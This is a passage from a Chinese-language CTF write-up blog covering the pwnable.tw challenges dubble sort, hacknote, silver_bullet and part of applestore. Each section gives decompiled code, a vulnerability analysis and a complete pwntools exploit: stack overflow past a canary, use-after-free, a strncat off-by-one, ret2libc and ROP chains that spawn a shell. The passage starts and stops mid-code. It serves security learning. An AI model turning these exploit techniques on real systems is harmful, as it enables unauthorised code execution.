class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">calc</span><br></pre></td></tr></table></figure><h1 id="dubble-sort"><a href="#dubble-sort" class="headerlink" title="dubble sort"></a>dubble sort</h1><p>冒泡排序，小小的漏洞，简直就是课设车祸现场hhh<br>只找到了第一个漏洞，泄露下地址，然后gg</p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  int *v4; // edi</span><br><span class="line">  unsigned int v5; // esi</span><br><span class="line">  unsigned int v6; // esi</span><br><span class="line">  int v7; // ST08_4</span><br><span class="line">  int result; // eax</span><br><span class="line">  unsigned int num; // [esp+18h] [ebp-74h]</span><br><span class="line">  int v10; // [esp+1Ch] [ebp-70h]</span><br><span class="line">  char buf; // [esp+3Ch] [ebp-50h]</span><br><span class="line">  unsigned int canary; // [esp+7Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(0x14u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(1, (int)&quot;What your name :&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x40u);                        // 没有截断，泄露libc基地址</span><br><span class="line">  __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%u&quot;, &amp;num);                    //没有限制输入个数，之后能栈溢出   </span><br><span class="line">  v3 = num;</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v10;</span><br><span class="line">    v5 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(1, (int)&quot;Enter the %d number : &quot;);  </span><br><span class="line">      fflush(stdout);</span><br><span class="line">      __isoc99_scanf(&quot;%u&quot;, v4);</span><br><span class="line">      ++v5;</span><br><span class="line">      v3 = num;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( num &gt; v5 );</span><br><span class="line">  &#125;                                             // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  dubblesort((unsigned int *)&amp;v10, v3);         // 出人意料的没有漏洞。。。。</span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Result :&quot;);                             // print</span><br><span class="line">  if ( num )                                    </span><br><span class="line">  &#123;</span><br><span class="line">    v6 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(&amp;v10 + v6);</span><br><span class="line">      __printf_chk(1, (int)&quot;%u &quot;);</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( num &gt; v6 );</span><br><span class="line">  &#125;                                             // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  result = 0;</span><br><span class="line">  if ( __readgsdword(0x14u) != canary )</span><br><span class="line">    process_end();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>刚开始输入name，然后会将其打印出来，因为read没有\x00截断，所以可以泄露出栈内存泄露libc基地址。</p><p>之后在输入个数时scanf不会限制个数，所以之后排完序后会栈溢出，但是因为程序有canary保护，不知道怎么利用。</p><p>大概是因为canary &lt; system_addr &lt; binsh_addr 所以试图让排序后的canary仍然不变，system覆盖返回地址，之后在有个/bin/sh</p><p>整体思路便是ret2libc</p><p>他们不知道怎么发现的如果在排序的时候输入 +  会输出栈的内容且不退出，只知道输入abc这些字符会直接输出栈内容并退出<br>。。。之前输出的数据一直很少，没发现。。</p><p>ps:新的寻找/bin/sh的方法！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C ./libc_32.so.6|grep  /bin  -A 1</span><br></pre></td></tr></table></figure></p><p><em>而且之前的gdb还是有问题的，attach会直接终结进程，之后会找个法子用ida调试，那样子会舒服不少。</em></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><p>先把大佬的放上来吧。。之后自己调成功了再放自己的。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">got_off = 0x1b0000</span><br><span class="line">system_off = 0x3a940</span><br><span class="line">bin_sh_off = 0x158e8b</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;,10101)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;a&apos;*24)</span><br><span class="line">got_addr = u32(p.recv()[30:34])-0xa</span><br><span class="line">libc_addr = got_addr-got_off</span><br><span class="line">system_addr = libc_addr + system_off</span><br><span class="line">bin_sh_addr = libc_addr + bin_sh_off</span><br><span class="line">p.sendline(&apos;35&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(9):</span><br><span class="line">    p.sendline(str(system_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(str(bin_sh_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://bbs.pediy.com/thread-228226.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228226.htm</a></p><h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><p>看着好生熟悉，看了下题目，感觉是之前的UAF的题，回去看了下，果然是hhhhh，不过这次多给了个libc，去掉了之前的之前打印flag的函数、</p><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>三个功能，添加，打印，删除、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // ebx</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( idx &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] = malloc(8u);                    // ptr[i]  *ptr</span><br><span class="line">                                                // </span><br><span class="line">        if ( !ptr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)ptr[i] = sub_804862B;        // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = ptr[i];</span><br><span class="line">        v0[1] = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)ptr[i] + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;                                       // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)ptr[i] + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++idx;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int print()</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  idx = atoi(&amp;buf);</span><br><span class="line">  if ( idx &lt; 0 || idx &gt;= ::idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[idx] )</span><br><span class="line">    (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int sub_80487D4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)ptr[v1] + 1));              // ptr[v1] puts指针</span><br><span class="line">                                                // ptr[v1]+1 content指针</span><br><span class="line">    free(ptr[v1]);                              // uaf</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>add 函数会分配大小为8的内存块存放puts与content的指针，因为free之后没有将其指向null，所以可以利用uaf漏洞<br>覆盖note0的指针，将其指向某got地址，print泄露真实地址，计算得到system真实地址<br>再次修改其为system地址，需要使用参数截断—system的参数即为结构体本身<br>这里需要使用system的参数截断，例如  “||sh”或者”;sh”</p><p><em>感觉正在用着残破不堪的工具。。要完了</em></p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">      sh.recvuntil(&quot;choice :&quot;)</span><br><span class="line">      sh.sendline(&quot;1&quot;)</span><br><span class="line">      sh.recvuntil(&quot;size :&quot;)</span><br><span class="line"></span><br><span class="line">      sh.sendline(size)</span><br><span class="line">      sh.recvuntil(&quot;Content :&quot;)</span><br><span class="line">      sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">      sh.recvuntil(&quot;choice :&quot;) </span><br><span class="line">      sh.sendline(&quot;2&quot;) </span><br><span class="line">      sh.recvuntil(&quot;Index :&quot;) </span><br><span class="line">      sh.sendline(index) </span><br><span class="line"></span><br><span class="line">def print(index): </span><br><span class="line">    sh.recvuntil(&quot;choice :&quot;) </span><br><span class="line">    sh.sendline(&quot;3&quot;) </span><br><span class="line">    sh.recvuntil(&quot;Index :&quot;) </span><br><span class="line">    sh.sendline(index)</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./hacknote&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;, 10102)</span><br><span class="line">elf=ELF(&quot;./hacknote&quot;)</span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">putnote=0x804862b</span><br><span class="line"></span><br><span class="line">add(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">add(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">delete(&apos;0&apos;)</span><br><span class="line">delete(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">add(&apos;8&apos;,p32(putnote)+p32(read_got))</span><br><span class="line">print(&apos;0&apos;) </span><br><span class="line">read_addr=u32(sh.recv()[:4])</span><br><span class="line">print hex(read_addr)</span><br><span class="line"></span><br><span class="line">sys_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;] </span><br><span class="line">delete(&apos;2&apos;) </span><br><span class="line">add(&apos;8&apos;,p32(sys_addr)+&quot;;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">print(&apos;0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver_bullet"></a>silver_bullet</h1><p><em>风格比较有意思的一个题目</em></p><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>三个选项:<br>1.create_bullet description最大为0x30，<br>2.power_up 若description小于0x30,最多可以增加至0x30，<br>3.beat 用上面的power beat HP为0x7fffffff的werewolf，打败便退出。</p><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl power_up(char *bullet_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+0h] [ebp-34h]</span><br><span class="line">  size_t v3; // [esp+30h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  memset(&amp;s, 0, 0x30u);</span><br><span class="line">  if ( !*bullet_ptr )</span><br><span class="line">    return puts(&quot;You need create the bullet first !&quot;);</span><br><span class="line">  if ( *((_DWORD *)bullet_ptr + 12) &gt; 0x2Fu )</span><br><span class="line">    return puts(&quot;You can&apos;t power up any more !&quot;);</span><br><span class="line">  printf(&quot;Give me your another description of bullet :&quot;);</span><br><span class="line">  read_input(&amp;s, 48 - *((_DWORD *)bullet_ptr + 12));</span><br><span class="line"></span><br><span class="line">  strncat(bullet_ptr, &amp;s, 48 - *((_DWORD *)bullet_ptr + 12));</span><br><span class="line"></span><br><span class="line">  v3 = strlen(&amp;s) + *((_DWORD *)bullet_ptr + 12);</span><br><span class="line">  printf(&quot;Your new power is : %u\n&quot;, v3);</span><br><span class="line">  *((_DWORD *)bullet_ptr + 12) = v3;</span><br><span class="line">  return puts(&quot;Enjoy it !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>乍一看感觉逻辑没什么问题，寻找可能有问题的地方，最后问题在strncat上<br>因为程序的存在一个结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct bullet&#123;</span><br><span class="line">  char bullet_ptr[0x30]</span><br><span class="line">  int length</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而strncat合并字符串时，合并完之后会在后面加上\x00,因为上面结构体的存在，我们就有希望覆盖length，然后再次powerup便可以溢出覆盖返回地址了。</p><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><p>本地测试莫名其妙过不了，但是远程没问题。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#sh = process (&apos;./silver_bullet&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;,10103)</span><br><span class="line">elf = ELF(&apos;./silver_bullet&apos;)</span><br><span class="line">libc = ELF(&apos;libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def create(con):</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;of bullet :&apos;)</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def powerup(con):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;of bullet :&apos;)</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def beat():</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">pop_ebx_ret = 0x8048475</span><br><span class="line"></span><br><span class="line">create(&apos;a&apos;*(0x30-1))</span><br><span class="line">powerup(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;\xff&apos;*3 + &apos;zzzz&apos;</span><br><span class="line">pay += p32(elf.plt[&apos;puts&apos;]) + p32(pop_ebx_ret) + p32(elf.got[&apos;puts&apos;])</span><br><span class="line">pay += p32(elf.symbols[&apos;main&apos;])</span><br><span class="line"></span><br><span class="line">powerup(pay)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;win !!\n&apos;)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">system_addr = puts_addr - libc.symbols[&apos;puts&apos;] +  libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line"></span><br><span class="line">success(&quot;system_addr : &quot; + hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr : &quot; + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(&apos;a&apos;*(0x30-1))</span><br><span class="line">powerup(&apos;1&apos;)</span><br><span class="line">pay = &apos;\xff&apos;*3 + &apos;bbbb&apos;</span><br><span class="line">pay += p32(system_addr) + p32(pop_ebx_ret) + p32(binsh_addr)</span><br><span class="line">powerup(pay)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h1><p><em>好难啊啊啊啊啊，心累的不行，看大佬的wp回回血</em></p><p>ps: 假如在    libc = ELF(‘./libc_32.so.6’) 时出现这种报错：ValueError: seek out of range ， 多半就是文件没下载完全。。</p><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>主要功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;=== Menu ===&quot;);</span><br><span class="line">  printf(&quot;%d: Apple Store\n&quot;, 1);</span><br><span class="line">  printf(&quot;%d: Add into your shopping cart\n&quot;, 2);</span><br><span class="line">  printf(&quot;%d: Remove from your shopping cart\n&quot;, 3);</span><br><span class="line">  printf(&quot;%d: List your shopping cart\n&quot;, 4);</span><br><span class="line">  printf(&quot;%d: Checkout\n&quot;, 5);</span><br><span class="line">  return printf(&quot;%d: Exit\n&quot;, 6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int handler()</span><br><span class="line">&#123;</span><br><span class="line">  char nptr; // [esp+16h] [ebp-22h]</span><br><span class="line">  unsigned int v2; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;&gt; &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    my_read(&amp;nptr, 0x15u);</span><br><span class="line">    switch ( atoi(&amp;nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        list();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        delete();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        cart();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        checkout();</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        puts(&quot;Thank You for Your Purchase!&quot;);</span><br><span class="line">        return __readgsdword(0x14u) ^ v2;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;It&apos;s not a choice! Idiot.&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 